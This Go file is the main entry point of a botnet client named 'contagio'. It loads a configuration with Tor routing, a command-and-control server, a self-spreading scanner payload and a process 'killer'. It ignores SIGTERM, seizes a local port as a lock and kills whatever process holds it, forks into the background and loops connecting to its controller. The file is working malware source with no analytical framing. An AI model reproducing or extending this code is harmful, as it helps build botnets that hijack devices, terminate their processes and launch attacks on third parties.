package main

import (
	"contagio/bot/config"
	"contagio/bot/methods"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"syscall"
	"time"
)

type BotInfo struct {
	Arch string
}

var TestMode bool
var NoFork bool
var Bot *BotInfo

func main() {
	defer methods.Catch()

	config.Config()
	cmd()
	if config.DEBUG {
		fmt.Printf("CONFIG:\nTor Enabled: %t\nTor Server: %s\nTor Port: %s\nBot server: %s\nBot port: %s\nScanner enabled: %t\nScanner payload: %s\nScanner min num cpu: %d\nMax cpu value: %d\nKiller enabled: %t\nMin-Max killer pid: %d-%d\n------------------------\n", config.TOR_ENABLED, config.TOR_SERVER, config.TOR_PORT, config.BOT_SERVER, config.BOT_PORT, config.SCANNER_ENABLED, config.SCANNER_PAYLOAD, config.SCANNER_MIN_NUM_CPU, config.MAX_CPU_VALUE, config.KILLER_ENABLED, config.MIN_KILLER_PID, config.MAX_KILLER_PID)
	}

	signal.Ignore(syscall.SIGTERM)

	if config.DEBUG {
		pid := syscall.Getpid()
		fmt.Println("Process id: ", pid)
	}

	if !TestMode {
		addr := syscall.SockaddrInet4{
			Port: 4628,
			Addr: [4]byte{127, 0, 0, 1},
		}

		var attempts int
		for {
			if fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0); err == nil {
				defer syscall.Close(fd)

				err := syscall.Bind(fd, &addr)
				if err != nil {
					if config.DEBUG {
						fmt.Println("[init] Can't bind 4628 port: " + err.Error())
					}
					attempts++
					if attempts >= 4 {
						os.Exit(1)
					}
					KillByPort(4628)
					time.Sleep(1 * time.Second)
					continue
				}

				err = syscall.Listen(fd, 1)
				if err != nil && config.DEBUG {
					fmt.Println("[init] Can't listen 4628 port: " + err.Error())
				}
			}
			break
		}

		CpuMonitor()

		go Watchdog()

		if config.KILLER_ENABLED {
			go KillerInit()
		}

		defer methods.Catch()

		exec.Command("ulimit", "-n", "99999").Run()

	} else {
		fmt.Println("TEST MODE: YES")
	}

	Bot = initbot()

	if !NoFork {
		id, _, _ := syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)
		if id == 0 {
			fmt.Println("[main] Forked:", syscall.Getpid())
			for {
				MainConnect()
			}
		}
	} else {
		for {
			MainConnect()
		}

	}
}

func initbot() *BotInfo {
	defer methods.Catch()

	var arch string

	if runtime.GOARCH == "" {
		arch = "undefined"
	} else {
		arch = runtime.GOARCH
	}

	return &BotInfo{
		Arch: arch,
	}
}

func cmd() {
	if len(os.Args) > 1 {
		if os.Args[1] == "--test" {
			TestMode = true
		}
		if os.Args[1] == "--nofork" {
			NoFork = true
		}
		if os.Args[1] == "--nodebug" {
			config.DEBUG = false
		}
		if os.Args[1] == "--debug" {
			config.DEBUG = true
		}

	}
	if len(os.Args) > 2 {
		if os.Args[2] == "--test" {
			TestMode = true
		}
		if os.Args[2] == "--nofork" {
			NoFork = true
		}

		if os.Args[2] == "--nodebug" {
			config.DEBUG = false
		}
		if os.Args[2] == "--debug" {
			config.DEBUG = true
		}

	}

	if len(os.Args) > 3 {
		if os.Args[3] == "--test" {
			TestMode = true
		}
		if os.Args[3] == "--nofork" {
			NoFork = true
		}

		if os.Args[3] == "--nodebug" {
			config.DEBUG = false
		}
		if os.Args[3] == "--debug" {
			config.DEBUG = true
		}

	}

}
